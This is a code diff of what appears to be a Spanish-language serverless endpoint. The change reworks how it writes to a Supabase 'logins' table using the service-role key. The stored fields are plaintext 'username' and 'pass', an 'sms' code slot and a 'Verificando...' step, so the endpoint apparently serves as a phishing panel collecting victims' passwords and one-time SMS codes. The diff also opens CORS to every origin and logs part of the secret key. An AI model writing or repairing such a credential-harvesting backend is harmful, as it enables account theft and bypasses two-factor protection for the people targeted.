@@ -1,13 +1,13 @@
-import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
-
 export default async function handler(req, res) {
-  // CORS
+  // CORS primero
+  res.setHeader('Access-Control-Allow-Credentials', 'true');
   res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
+  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');
 
   if (req.method === 'OPTIONS') {
-    return res.status(200).end();
+    res.status(200).end();
+    return;
   }
 
   if (req.method !== 'POST') {
@@ -27,22 +27,22 @@ export default async function handler(req, res) {
       return res.status(403).json({ error: 'Spam detectado' });
     }
 
-    // Crear cliente Supabase con la nueva key (sbp_...)
-    const supabase = createClient(
-      process.env.SUPABASE_URL,
-      process.env.SUPABASE_SERVICE_ROLE_KEY,
-      {
-        auth: {
-          autoRefreshToken: false,
-          persistSession: false
-        }
-      }
-    );
+    // USAR LA LEGACY KEY (la que empieza con eyJhbG...), no la sbp_
+    const SUPABASE_URL = process.env.SUPABASE_URL;
+    const SERVICE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
 
-    // Insertar usando la librería (más confiable)
-    const { error } = await supabase
-      .from('logins')
-      .insert({
+    console.log('URL:', SUPABASE_URL);
+    console.log('KEY starts with:', SERVICE_KEY?.substring(0, 10) + '...');
+
+    const response = await fetch(`${SUPABASE_URL}/rest/v1/logins`, {
+      method: 'POST',
+      headers: {
+        'apikey': SERVICE_KEY,
+        'Authorization': `Bearer ${SERVICE_KEY}`,
+        'Content-Type': 'application/json',
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify({
         id: id || crypto.randomUUID(),
         username,
         pass,
@@ -51,11 +51,13 @@ export default async function handler(req, res) {
         step: 'Verificando...',
         sms: '----',
         created_at: new Date().toISOString()
-      });
+      })
+    });
 
-    if (error) {
-      console.error('Supabase error:', error);
-      return res.status(500).json({ error: error.message });
+    if (!response.ok) {
+      const errorText = await response.text();
+      console.error('Supabase error:', errorText);
+      return res.status(500).json({ error: 'Error al guardar' });
     }
 
     res.status(200).json({ success: true });
